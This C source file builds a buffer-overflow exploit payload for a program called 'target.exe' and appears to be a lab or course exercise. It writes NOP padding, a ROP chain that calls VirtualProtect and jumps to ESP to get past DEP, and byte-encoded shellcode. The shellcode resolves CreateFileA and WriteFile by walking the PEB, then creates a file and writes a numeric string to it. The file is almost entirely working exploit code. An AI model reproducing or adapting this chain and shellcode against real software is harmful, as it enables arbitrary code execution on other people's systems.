#include <stdio.h>

// gcc ./exportdata.c -o exportdata.exe

int rop_chain[18] = {
    //[---INFO:gadgets_to_set_ebp:---]
    0x009d40a3,  // POP EBP // RETN [target.exe]
    // 0x0,
    // 0x0, // magic?
    0x009d40a3,  // skip 4 bytes [target.exe]
    //[---INFO:gadgets_to_set_ebx:---]
    0x008f3ee5,  // POP EBX // RETN [target.exe]
    0x00000201,  // 0x00000201-> ebx
    //[---INFO:gadgets_to_set_edx:---]
    0x00b13324,  // POP EDX // RETN [target.exe]
    0x00000040,  // 0x00000040-> edx
    //[---INFO:gadgets_to_set_ecx:---]
    0x00df5129,  // POP ECX // RETN [target.exe] 
    0x0046c290,  // &Writable location [target.exe]
    //[---INFO:gadgets_to_set_edi:---]
    0x00d219a9,  // POP EDI // RETN [target.exe] 
    0x00757104,  // RETN (ROP NOP) [target.exe]
    //[---INFO:gadgets_to_set_esi:---]
    0x00e01ee4,  // POP ESI // RETN [target.exe] 
    0x0074d258,  // JMP [EAX] [target.exe]
    0x00b134b4,  // POP EAX // RETN [target.exe] 
    0x00f00838,  // ptr to &VirtualProtect() [IAT target.exe]
    //[---INFO:pushad:---]
    0x00b12cb1,  // PUSHAD // RETN [target.exe] 
    //[---INFO:extras:---]
    0x008f8e22  // ptr to 'jmp esp' [target.exe]
};

// shellcode


char shellcode[1360 + 1] = {
'\x55','\x8b','\xec','\x81','\xec','\x14','\x01','\x00','\x00','\xb8','\x4b','\x00','\x00','\x00','\x66','\x89','\x85','\x5c','\xff','\xff','\xff','\xb9','\x45','\x00','\x00','\x00','\x66','\x89','\x8d','\x5e','\xff','\xff','\xff','\xba','\x52','\x00','\x00','\x00','\x66','\x89','\x95','\x60','\xff','\xff','\xff','\xb8','\x4e','\x00','\x00','\x00','\x66','\x89','\x85','\x62','\xff','\xff','\xff','\xb9','\x45','\x00','\x00','\x00','\x66','\x89','\x8d','\x64','\xff','\xff','\xff','\xba','\x4c','\x00','\x00','\x00','\x66','\x89','\x95','\x66','\xff','\xff','\xff','\xb8','\x33','\x00','\x00','\x00','\x66','\x89','\x85','\x68','\xff','\xff','\xff','\xb9','\x32','\x00','\x00','\x00','\x66','\x89','\x8d','\x6a','\xff','\xff','\xff','\xba','\x2e','\x00','\x00','\x00','\x66','\x89','\x95','\x6c','\xff','\xff','\xff','\xb8','\x44','\x00','\x00','\x00','\x66','\x89','\x85','\x6e','\xff','\xff','\xff','\xb9','\x4c','\x00','\x00','\x00','\x66','\x89','\x8d','\x70','\xff','\xff','\xff','\xba','\x4c','\x00','\x00','\x00','\x66','\x89','\x95','\x72','\xff','\xff','\xff','\x33','\xc0','\x66','\x89','\x85','\x74','\xff','\xff','\xff','\xc6','\x45','\xb8','\x43','\xc6','\x45','\xb9','\x72','\xc6','\x45','\xba','\x65','\xc6','\x45','\xbb','\x61','\xc6','\x45','\xbc','\x74','\xc6','\x45','\xbd','\x65','\xc6','\x45','\xbe','\x46','\xc6','\x45','\xbf','\x69','\xc6','\x45','\xc0','\x6c','\xc6','\x45','\xc1','\x65','\xc6','\x45','\xc2','\x41','\xc6','\x45','\xc3','\x00','\xc6','\x45','\xd0','\x57','\xc6','\x45','\xd1','\x72','\xc6','\x45','\xd2','\x69','\xc6','\x45','\xd3','\x74','\xc6','\x45','\xd4','\x65','\xc6','\x45','\xd5','\x46','\xc6','\x45','\xd6','\x69','\xc6','\x45','\xd7','\x6c','\xc6','\x45','\xd8','\x65','\xc6','\x45','\xd9','\x00','\xc6','\x45','\x90','\x52','\xc6','\x45','\x91','\x65','\xc6','\x45','\x92','\x61','\xc6','\x45','\x93','\x64','\xc6','\x45','\x94','\x46','\xc6','\x45','\x95','\x69','\xc6','\x45','\x96','\x6c','\xc6','\x45','\x97','\x65','\xc6','\x45','\x98','\x00','\xc6','\x45','\xc4','\x2e','\xc6','\x45','\xc5','\x5c','\xc6','\x45','\xc6','\x6e','\xc6','\x45','\xc7','\x65','\xc6','\x45','\xc8','\x77','\xc6','\x45','\xc9','\x2e','\xc6','\x45','\xca','\x74','\xc6','\x45','\xcb','\x78','\xc6','\x45','\xcc','\x74','\xc6','\x45','\xcd','\x00','\xc6','\x45','\xa8','\x32','\xc6','\x45','\xa9','\x30','\xc6','\x45','\xaa','\x32','\xc6','\x45','\xab','\x30','\xc6','\x45','\xac','\x33','\xc6','\x45','\xad','\x30','\xc6','\x45','\xae','\x32','\xc6','\x45','\xaf','\x31','\xc6','\x45','\xb0','\x38','\xc6','\x45','\xb1','\x31','\xc6','\x45','\xb2','\x30','\xc6','\x45','\xb3','\x32','\xc6','\x45','\xb4','\x31','\xc6','\x45','\xb5','\x00','\x64','\x8b','\x15','\x30','\x00','\x00','\x00','\x8b','\x52','\x0c','\x8b','\x52','\x0c','\x89','\x55','\x88','\x8b','\x4d','\x88','\x89','\x4d','\xf0','\xba','\x01','\x00','\x00','\x00','\x85','\xd2','\x0f','\x84','\x93','\x00','\x00','\x00','\x8b','\x45','\xf0','\x8b','\x48','\x30','\x89','\x8d','\x1c','\xff','\xff','\xff','\x8d','\x95','\x5c','\xff','\xff','\xff','\x89','\x95','\x04','\xff','\xff','\xff','\xc7','\x45','\xf4','\x00','\x00','\x00','\x00','\xeb','\x09','\x8b','\x45','\xf4','\x83','\xc0','\x01','\x89','\x45','\xf4','\xb9','\x0c','\x00','\x00','\x00','\xd1','\xe1','\x39','\x4d','\xf4','\x7d','\x27','\x8b','\x95','\x1c','\xff','\xff','\xff','\x03','\x55','\xf4','\x0f','\xbe','\x02','\x8b','\x8d','\x04','\xff','\xff','\xff','\x03','\x4d','\xf4','\x0f','\xbe','\x11','\x3b','\xc2','\x74','\x09','\xc7','\x45','\x8c','\x00','\x00','\x00','\x00','\xeb','\x09','\xeb','\xc4','\xc7','\x45','\x8c','\x01','\x00','\x00','\x00','\x83','\x7d','\x8c','\x00','\x74','\x0b','\x8b','\x45','\xf0','\x8b','\x48','\x18','\x89','\x4d','\xfc','\xeb','\x25','\x8b','\x55','\xf0','\x8b','\x02','\x89','\x45','\xf0','\x8b','\x4d','\xf0','\x3b','\x4d','\x88','\x75','\x09','\xc7','\x45','\xfc','\x00','\x00','\x00','\x00','\xeb','\x0c','\xe9','\x60','\xff','\xff','\xff','\xc7','\x45','\xfc','\x00','\x00','\x00','\x00','\x8b','\x55','\xfc','\x89','\x95','\x00','\xff','\xff','\xff','\x8b','\x85','\x00','\xff','\xff','\xff','\x8b','\x4d','\xfc','\x03','\x48','\x3c','\x89','\x8d','\xfc','\xfe','\xff','\xff','\xba','\x08','\x00','\x00','\x00','\x6b','\xc2','\x00','\x8b','\x8d','\xfc','\xfe','\xff','\xff','\x8b','\x54','\x01','\x78','\x89','\x95','\xf8','\xfe','\xff','\xff','\x8b','\x45','\xfc','\x03','\x85','\xf8','\xfe','\xff','\xff','\x89','\x45','\xe0','\x8b','\x4d','\xe0','\x8b','\x51','\x18','\x89','\x95','\xf4','\xfe','\xff','\xff','\x8b','\x45','\xe0','\x8b','\x4d','\xfc','\x03','\x48','\x1c','\x89','\x8d','\x44','\xff','\xff','\xff','\x8b','\x55','\xe0','\x8b','\x45','\xfc','\x03','\x42','\x20','\x89','\x85','\x58','\xff','\xff','\xff','\x8b','\x4d','\xe0','\x8b','\x55','\xfc','\x03','\x51','\x24','\x89','\x95','\x48','\xff','\xff','\xff','\xc7','\x45','\xf8','\x00','\x00','\x00','\x00','\xeb','\x09','\x8b','\x45','\xf8','\x83','\xc0','\x01','\x89','\x45','\xf8','\x8b','\x4d','\xf8','\x3b','\x8d','\xf4','\xfe','\xff','\xff','\x0f','\x83','\xb4','\x00','\x00','\x00','\x8b','\x55','\xf8','\x8b','\x85','\x58','\xff','\xff','\xff','\x8b','\x4d','\xfc','\x03','\x0c','\x90','\x89','\x8d','\x54','\xff','\xff','\xff','\x8b','\x95','\x54','\xff','\xff','\xff','\x89','\x95','\x50','\xff','\xff','\xff','\x8d','\x45','\xb8','\x89','\x85','\x4c','\xff','\xff','\xff','\xc7','\x45','\xec','\x00','\x00','\x00','\x00','\xeb','\x09','\x8b','\x4d','\xec','\x83','\xc1','\x01','\x89','\x4d','\xec','\xba','\x0b','\x00','\x00','\x00','\xc1','\xe2','\x00','\x39','\x55','\xec','\x7d','\x27','\x8b','\x85','\x50','\xff','\xff','\xff','\x03','\x45','\xec','\x0f','\xbe','\x08','\x8b','\x95','\x4c','\xff','\xff','\xff','\x03','\x55','\xec','\x0f','\xbe','\x02','\x3b','\xc8','\x74','\x09','\xc7','\x45','\x84','\x00','\x00','\x00','\x00','\xeb','\x09','\xeb','\xc3','\xc7','\x45','\x84','\x01','\x00','\x00','\x00','\x83','\x7d','\x84','\x01','\x75','\x32','\x8b','\x4d','\xf8','\x8b','\x95','\x48','\xff','\xff','\xff','\x66','\x8b','\x04','\x4a','\x66','\x89','\x45','\xa0','\x0f','\xb7','\x4d','\xa0','\x8b','\x95','\x44','\xff','\xff','\xff','\x8b','\x45','\xfc','\x03','\x04','\x8a','\x89','\x85','\x40','\xff','\xff','\xff','\x8b','\x8d','\x40','\xff','\xff','\xff','\x89','\x4d','\x80','\xeb','\x0c','\xe9','\x34','\xff','\xff','\xff','\xc7','\x45','\x80','\x00','\x00','\x00','\x00','\x8b','\x55','\x80','\x89','\x95','\x10','\xff','\xff','\xff','\x8b','\x45','\xfc','\x89','\x85','\x3c','\xff','\xff','\xff','\x8b','\x8d','\x3c','\xff','\xff','\xff','\x8b','\x55','\xfc','\x03','\x51','\x3c','\x89','\x95','\x38','\xff','\xff','\xff','\xb8','\x08','\x00','\x00','\x00','\x6b','\xc8','\x00','\x8b','\x95','\x38','\xff','\xff','\xff','\x8b','\x44','\x0a','\x78','\x89','\x85','\x34','\xff','\xff','\xff','\x8b','\x4d','\xfc','\x03','\x8d','\x34','\xff','\xff','\xff','\x89','\x4d','\xdc','\x8b','\x55','\xdc','\x8b','\x42','\x18','\x89','\x85','\x30','\xff','\xff','\xff','\x8b','\x4d','\xdc','\x8b','\x55','\xfc','\x03','\x51','\x1c','\x89','\x95','\x18','\xff','\xff','\xff','\x8b','\x45','\xdc','\x8b','\x4d','\xfc','\x03','\x48','\x20','\x89','\x8d','\x2c','\xff','\xff','\xff','\x8b','\x55','\xdc','\x8b','\x45','\xfc','\x03','\x42','\x24','\x89','\x85','\x08','\xff','\xff','\xff','\xc7','\x45','\xe4','\x00','\x00','\x00','\x00','\xeb','\x09','\x8b','\x4d','\xe4','\x83','\xc1','\x01','\x89','\x4d','\xe4','\x8b','\x55','\xe4','\x3b','\x95','\x30','\xff','\xff','\xff','\x0f','\x83','\xc0','\x00','\x00','\x00','\x8b','\x45','\xe4','\x8b','\x8d','\x2c','\xff','\xff','\xff','\x8b','\x55','\xfc','\x03','\x14','\x81','\x89','\x95','\x28','\xff','\xff','\xff','\x8b','\x85','\x28','\xff','\xff','\xff','\x89','\x85','\x24','\xff','\xff','\xff','\x8d','\x4d','\xd0','\x89','\x8d','\x20','\xff','\xff','\xff','\xc7','\x45','\xe8','\x00','\x00','\x00','\x00','\xeb','\x09','\x8b','\x55','\xe8','\x83','\xc2','\x01','\x89','\x55','\xe8','\xb8','\x09','\x00','\x00','\x00','\xc1','\xe0','\x00','\x39','\x45','\xe8','\x7d','\x2a','\x8b','\x8d','\x24','\xff','\xff','\xff','\x03','\x4d','\xe8','\x0f','\xbe','\x11','\x8b','\x85','\x20','\xff','\xff','\xff','\x03','\x45','\xe8','\x0f','\xbe','\x08','\x3b','\xd1','\x74','\x0c','\xc7','\x85','\x7c','\xff','\xff','\xff','\x00','\x00','\x00','\x00','\xeb','\x0c','\xeb','\xc0','\xc7','\x85','\x7c','\xff','\xff','\xff','\x01','\x00','\x00','\x00','\x83','\xbd','\x7c','\xff','\xff','\xff','\x01','\x75','\x35','\x8b','\x55','\xe4','\x8b','\x85','\x08','\xff','\xff','\xff','\x66','\x8b','\x0c','\x50','\x66','\x89','\x4d','\xa4','\x0f','\xb7','\x55','\xa4','\x8b','\x85','\x18','\xff','\xff','\xff','\x8b','\x4d','\xfc','\x03','\x0c','\x90','\x89','\x8d','\x14','\xff','\xff','\xff','\x8b','\x95','\x14','\xff','\xff','\xff','\x89','\x95','\x78','\xff','\xff','\xff','\xeb','\x0f','\xe9','\x28','\xff','\xff','\xff','\xc7','\x85','\x78','\xff','\xff','\xff','\x00','\x00','\x00','\x00','\x8b','\x85','\x78','\xff','\xff','\xff','\x89','\x85','\x0c','\xff','\xff','\xff','\xc7','\x45','\x9c','\xff','\xff','\xff','\xff','\x6a','\x00','\x68','\x80','\x00','\x00','\x00','\x6a','\x01','\x6a','\x00','\x6a','\x00','\x68','\x00','\x00','\x00','\x40','\x8d','\x4d','\xc4','\x51','\xff','\x95','\x10','\xff','\xff','\xff','\x89','\x45','\x9c','\x6a','\x00','\x8d','\x95','\xf0','\xfe','\xff','\xff','\x52','\x6a','\x0d','\x8d','\x45','\xa8','\x50','\x8b','\x4d','\x9c','\x51','\xff','\x95','\x0c','\xff','\xff','\xff','\x89','\x85','\xec','\xfe','\xff','\xff','\x8b','\xe5','\x5d','\xc3',0
};

const int buffer_size = 196;
char * file_name = "shellcode.bin";
int main(){
    FILE* shellcode_fp = fopen(file_name, "wb");
    for(int i = 0; i < buffer_size + 4; i++){
        fprintf(shellcode_fp, "\x90");
    }
    fwrite(rop_chain, sizeof(int), 16, shellcode_fp);
    fwrite(shellcode, sizeof(char), 1360, shellcode_fp);
    fclose(shellcode_fp);
    return 0;
}